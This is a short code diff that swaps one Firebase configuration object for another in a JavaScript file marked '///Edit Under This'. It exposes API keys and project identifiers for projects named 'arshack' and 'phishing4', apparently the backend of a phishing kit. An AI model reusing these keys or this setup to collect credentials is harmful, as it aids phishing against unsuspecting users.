@@ -4,14 +4,14 @@
 ///Edit Under This
 
 const firebaseConfig = {
-  apiKey: "AIzaSyD6Kb6ItE6Y2WBJcs3FVrsCicKu_53_fBA",
-  authDomain: "arshack-d0d7b.firebaseapp.com",
-  databaseURL: "https://arshack-d0d7b.firebaseio.com",
-  projectId: "arshack-d0d7b",
-  storageBucket: "arshack-d0d7b.appspot.com",
-  messagingSenderId: "569768315113",
-  appId: "1:569768315113:web:2d5fdf53733dceb4cfc878",
-  measurementId: "G-HCC795CR59"
+  apiKey: "AIzaSyBlRyHRpADmKbqr1NIpYCNhPZ3AUg5FVY4",
+  authDomain: "phishing4-64d31.firebaseapp.com",
+  databaseURL: "https://phishing4-64d31.firebaseio.com",
+  projectId: "phishing4-64d31",
+  storageBucket: "phishing4-64d31.appspot.com",
+  messagingSenderId: "1051556627971",
+  appId: "1:1051556627971:web:af938a46a0090e0f303036",
+  measurementId: "G-JRMT4746FG"
 };
 
      
